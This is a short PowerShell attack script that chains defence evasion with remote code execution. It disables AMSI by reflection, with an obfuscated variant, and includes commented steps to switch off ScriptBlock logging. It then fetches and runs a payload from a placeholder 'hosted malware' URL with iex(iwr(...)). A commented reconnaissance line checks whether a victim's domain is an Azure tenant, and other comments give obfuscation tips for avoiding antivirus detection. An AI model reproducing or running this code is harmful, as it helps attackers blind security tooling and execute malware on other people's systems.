# Script By John Fawcett
#Please substitute variables and open code script blocks values where needed!

$URL = Https://<my hosted malware>.com


# Disable AMSI via reflection:

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# I used the same technique as the ScriptBlockLogging  to obfuscate the above command - not sure if this works

#[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')."GetF'ield"('amsiInitFailed','NonP'+'ublic,Static').SetValue($null,$true)


# Disable ScriptBlock Logging (only open if local admin) - Remove Tags if local Admin

#$GPF=
#[ref].Assembly.GetType('System.Management.Automation.Utils')."GetF'ield" ('cachedGroupPolicySettings', 'NonP' + 'ublic,Static')
# $GPS= $GPF.GetValue($null)

#Note: string concatenation used to obfuscate

#Fileless Download and execute for PS1
iex(iwr("https://$URL"))

#Bonus: Check if their domain is also a tenent of Azure!!
# $DOMAIN = yourvictim.com
# curl https://login.microsoftonline.com/$DOMAIN/.well-known/openid-configuration


# bad characters for ' concatenation are: 0,a,b, f, r, t, v.
#can also encode in base 64 once completed- WARNING!!! - Can look suspicious to modern AI based Antivirus 
# I would like to thank Sparc Flow's Book "Hack Like a Legend" for all this research. I am merely trying to automate/build upon his or her work
# I would also like to thank https://github.com/swisskyrepo/PayloadsAllTheThings and https://www.infosecmatter.com/powershell-commands-for-pentesters/ for commands
